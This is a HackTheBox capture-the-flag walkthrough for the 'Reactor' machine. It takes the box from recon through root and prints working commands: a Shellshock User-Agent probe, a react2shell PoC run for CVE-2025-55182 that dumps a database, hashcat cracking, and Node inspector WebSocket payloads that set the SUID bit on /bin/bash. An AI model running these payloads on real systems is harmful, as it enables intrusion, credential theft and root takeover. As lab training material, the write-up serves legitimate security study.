## Reactor-HackTheBox🏴󠁧󠁢󠁥󠁮󠁧󠁿

### Recognition and Enumeration

#### First we're going to prove the conexión and run the host-
```bash
 ping -c3 10.129.11.10
```

<img width="968" height="227" alt="image" src="https://github.com/user-attachments/assets/9a83a8ef-2cc8-4c7a-8f69-23cbd5f31fd6" />


#### Then we're going to check the open ports with nmap.
```bash
nmap -sV -sC -p- --min-rate 5000 10.129.11.10
```

<img width="963" height="1042" alt="image" src="https://github.com/user-attachments/assets/a1e81bda-7af4-4484-a4c4-c8e305a4ae62" />


#### We're going to use foroxbuster for look at the page.
```bash
feroxbuster -u http://10.129.11.10:3000 -w /usr/share/wordlists/dirb/common.txt
```

<img width="965" height="904" alt="image" src="https://github.com/user-attachments/assets/93dd40bd-5130-41ec-8fa1-bdf5136f561c" />


#### Now we do a force a  fuzzing and we will do an inspection of the JS chunks .
```bash
feroxbuster -u http://10.129.11.10:3000/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl,py
```

<img width="970" height="569" alt="image" src="https://github.com/user-attachments/assets/b854f29d-79dc-44db-9dd3-e3096245178d" />


#### We're going to look at the ressult if the vulnerability exists at the file.
```bash
 curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://10.129.11.10:3000/cgi-bin/test.sh
```

<img width="971" height="1056" alt="image" src="https://github.com/user-attachments/assets/66f653fe-54b1-444c-99c8-106d59f65f77" />


#### Then we enter to the website for search something to crack.
```bash
http://10.129.11.10:3000/
```

<img width="985" height="384" alt="image" src="https://github.com/user-attachments/assets/22b8f15f-a38c-4286-9e06-d70e74ff478d" />


#### We'r going to click cnt + F5 for search the packets at the network on the webside.

<img width="964" height="454" alt="image" src="https://github.com/user-attachments/assets/fdecab65-eb01-47a6-8508-31c49331c5e8" />


#### We're going to use gobuster for search the hidden ports.
```bash
gobuster dir -u http://10.129.11.10:3000 -w /usr/share/wordlists/dirb/common.txt
```

<img width="967" height="533" alt="image" src="https://github.com/user-attachments/assets/5bb36146-7b1e-411e-b2a6-0e8bd89d4163" />





#### First of all, we will confirm that we can obtain a password without needing a key file using ssh
```bash
ssh -v elena@10.129.11.10
```

<img width="962" height="1046" alt="image" src="https://github.com/user-attachments/assets/fedcc78a-6351-4a79-9f6c-0ec797d9689d" />


### Exploitation


#### Now we need to git clone the CVE and the react2shell for exploit
```bash
 git clone https://github.com/dwisiswant0/CVE-2025-55182.git
git clone https://github.com/p3ta00/react2shell-poc.git
```

#### We're going to use the exploit.
```bash
sudo python3 react2shell-poc.py -t http://10.129.11.10:300
0 -c “id”
```

<img width="967" height="545" alt="image" src="https://github.com/user-attachments/assets/c3822457-f10c-4976-b484-4edc60723d1d" />


#### We found a sql database
```bash
python3 react2shell-poc.py -t http://10.129.11.10:3000 -c "sqlite3 /opt/reactor-app/reactor.db '.dump'"
```

<img width="963" height="691" alt="image" src="https://github.com/user-attachments/assets/640854b0-9ffe-4543-a470-c293f45022b3" />


#### Now we use hashcat for crack the key.
```bash
hashcat -m 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt
```

<img width="967" height="916" alt="image" src="https://github.com/user-attachments/assets/b4200d19-d9e5-4e30-95c8-00fa28fac6f2" />


#### Now we wnter with ssh
```bash
ssh engineer@10.129.11.10
```

*We have now the user key*


### Escalation of Privileges

#### Our user cant use sudo -l

<img width="809" height="78" alt="image" src="https://github.com/user-attachments/assets/8da9fb2e-733d-403a-8cd2-5b16cd680e34" />


#### Now we open a terminal with ssh -L for hear and another we prove with netstat
```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.11.10
netstat -tuln | grep 9229
```

<img width="957" height="664" alt="image" src="https://github.com/user-attachments/assets/97dad7f5-0ef7-4e90-a06f-cfdf80ce3ce0" />


#### We're going to check if we can use write were root.
```bash
curl -H "Content-Type: application/json" -X POST -d '{"id":1,"method":"Runtime.evaluate","params":{"expression":"require(\"fs\").writeFileSync(\"/tmp/test_root.txt\", \"HACKED\")"}}' http://127.0.0.1:9229/json/new
ls -l /tmp/test_root.txt
```

<img width="976" height="92" alt="image" src="https://github.com/user-attachments/assets/443d2a56-720a-4334-aedc-e507c18112a6" />



#### We start going to chrome://inspect

#### Then on the local terminal we search the id with node and we do a exploit with bash
```bash
 node -e "
                                            const WebSocket = require('ws');
                                            const ws = new WebSocket('ws://localhost:9229/4f3e66c0-f58c-47bc-ba52-fea718d80abb');
                                            ws.on('open', () => {
                                              ws.send(JSON.stringify({
                                                id: 1,
                                                method: 'Runtime.evaluate',
                                                params: { expression: 'require(\"child_process\").execSync(\"id\").toString()' }
                                              }));
                                            });
                                            ws.on('message', (data) => { console.log(data.toString()); ws.close(); });
                                            "
```

<img width="996" height="413" alt="image" src="https://github.com/user-attachments/assets/3e1454dc-7f18-4428-9787-1f6a73be9a82" />


#### Then we use the WebSockets
```bash
node -e "
                                            const WebSocket = require('ws');
                                            const ws = new WebSocket('ws://localhost:9229/4f3e66c0-f58c-47bc-ba52-fea718d80abb');
                                            ws.on('open', () => {
                                              ws.send(JSON.stringify({
                                                id: 1,
                                                method: 'Runtime.evaluate',
                                                params: { expression: 'process.mainModule.require(\"child_process\").execSync(\"id\").toString()' }
                                              }));
                                            });
                                            ws.on('message', (data) => { console.log(data.toString()); ws.close(); });
                                            "
```

<img width="991" height="350" alt="image" src="https://github.com/user-attachments/assets/649f30d5-b7a5-47d9-8d3e-4c42a2f21bca" />


#### Using all the chrome DevTools.
```bash
 node -e "
                                            const WebSocket = require('ws');
                                            const ws = new WebSocket('ws://localhost:9229/4f3e66c0-f58c-47bc-ba52-fea718d80abb');
                                            ws.on('open', () => {
                                              ws.send(JSON.stringify({
                                                id: 1,
                                                method: 'Runtime.evaluate',
                                                params: { expression: 'process.mainModule.require(\"child_process\").execSync(\"chmod +s /bin/bash\").toString()' }
                                              }));
                                            });
                                            ws.on('message', (data) => { console.log(data.toString()); ws.close(); });
                                            "
```

<img width="994" height="323" alt="image" src="https://github.com/user-attachments/assets/44a64ae0-7c8b-4d3b-819b-384f0059df8d" />


#### On the engineer machine we will use `bash -p` for connect and we escale to root

<img width="984" height="126" alt="image" src="https://github.com/user-attachments/assets/0461dc44-6760-4dac-8848-3dcf87cfeb89" />


<img width="541" height="461" alt="image" src="https://github.com/user-attachments/assets/ccb60205-ce54-4c4f-a577-925616d40e4a" />

